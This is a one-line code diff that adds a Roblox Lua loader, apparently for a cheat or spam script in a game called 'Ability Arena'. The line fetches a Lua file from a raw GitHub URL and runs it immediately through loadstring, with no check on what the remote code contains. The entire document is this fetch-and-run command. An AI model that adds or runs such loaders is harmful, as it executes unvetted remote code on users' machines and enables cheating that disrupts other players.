@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/ability-arena-spam7-t5p6mn6xoavtpt.lua"))()
